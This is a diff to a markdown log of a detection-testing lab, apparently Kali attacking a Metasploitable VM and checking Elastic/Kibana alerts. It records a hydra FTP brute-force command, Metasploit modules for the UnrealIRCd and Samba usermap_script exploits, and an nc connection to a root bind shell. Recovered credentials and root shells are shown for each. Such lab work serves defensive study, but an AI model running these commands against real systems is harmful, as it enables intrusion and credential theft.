@@ -31,41 +31,43 @@ the attack runner and pending execution/evidence.
 
 ---
 
-## A2 — FTP Brute Force  ⏳ PLANNED
-
-- **Technique:** Credential brute force against FTP (21)
+## A2 — FTP Brute Force  ✅ done
 - **MITRE ATT&CK ID:** T1110 (Brute Force)
-- **Tool / Command(s):** `hydra -L users.txt -P pass.txt ftp://192.168.128.4`
-- **Expected detection:** repeated FTP connections / auth attempts in Packetbeat.
-- **Evidence:** _pending — `logs/a2_hydra_ftp.txt`_
+- **Command:** `hydra -L users.txt -P pass.txt -f ftp://192.168.128.4`
+- **Result:** Valid credentials recovered — **`msfadmin` / `msfadmin`** on FTP (21).
+- **Evidence:** `logs/a2_hydra_ftp.txt`
+- **Detected by Elastic/Kibana?** Y — **72 flow events** to port 21 from .2→.4
+  (burst of repeated connections = brute-force signature).
 
-## A3 — UnrealIRCd 3.2.8.1 Backdoor  ⏳ PLANNED
+## A3 — UnrealIRCd 3.2.8.1 Backdoor  ✅ done
+- **MITRE ATT&CK ID:** T1190; **CVE-2010-2075**
+- **Command:** `metasploit exploit/unix/irc/unreal_ircd_3281_backdoor`
+- **Result:** Command-shell session opened `192.168.128.2:4444 → 192.168.128.4:50090`
+  — remote code execution on the target.
+- **Evidence:** `logs/a3_unrealircd.txt`
+- **Detected by Elastic/Kibana?** Y — **25 flow events** to port 6667 + reverse
+  shell flow back to Kali:4444.
 
-- **Technique:** Exploit backdoor command execution in UnrealIRCd on 6667
-- **MITRE ATT&CK ID:** T1190 (Exploit Public-Facing Application); **CVE-2010-2075**
-- **Tool / Command(s):** `metasploit exploit/unix/irc/unreal_ircd_3281_backdoor`
-- **Expected detection:** connection to 6667 + reverse shell flow to Kali.
-- **Evidence:** _pending — `logs/a3_unrealircd.txt`_
-
-## A4 — Samba usermap_script  ⏳ PLANNED
-
-- **Technique:** Command injection via Samba username map script
+## A4 — Samba usermap_script  ✅ done
 - **MITRE ATT&CK ID:** T1190; **CVE-2007-2447**
-- **Tool / Command(s):** `metasploit exploit/multi/samba/usermap_script`
-- **Expected detection:** SMB connection to 445 + reverse shell flow.
-- **Evidence:** _pending — `logs/a4_samba.txt`_
+- **Command:** `metasploit exploit/multi/samba/usermap_script`
+- **Result:** Command-shell session opened `192.168.128.2:4445 → 192.168.128.4:34697`
+  — RCE via the Samba username-map command injection.
+- **Evidence:** `logs/a4_samba.txt`
+- **Detected by Elastic/Kibana?** Y — **8 flow events** to port 445 + reverse shell flow.
 
-## A5 — Root Bindshell (1524)  ⏳ PLANNED
-
-- **Technique:** Connect to the exposed root bind shell left open on 1524
-- **MITRE ATT&CK ID:** T1190 / T1059 (Command and Scripting Interpreter)
-- **Tool / Command(s):** `nc 192.168.128.4 1524`
-- **Expected detection:** flow to the unusual port 1524.
-- **Evidence:** _pending — `logs/a5_bindshell.txt`_
+## A5 — Root Bindshell (1524)  ✅ done
+- **MITRE ATT&CK ID:** T1190 / T1059
+- **Command:** `nc 192.168.128.4 1524`
+- **Result:** Instant **root** shell — `uid=0(root) gid=0(root)` on
+  `metasploitable 2.6.24-16-server`.
+- **Evidence:** `logs/a5_bindshell_root.txt`
+- **Detected by Elastic/Kibana?** Y — **30 flow events** to the unusual port 1524.
 
 ---
 
 ## Log
 
-(Newest last; updated as attacks are executed.)
-- 2026-11-08 — A1 recon completed and captured.
+(Newest last.)
+- 2026-11-08 16:04–16:16 — A1 recon + A2–A5 exploits executed and captured.
+  All five detected in the SIEM (see `logs/detection_summary.txt`).
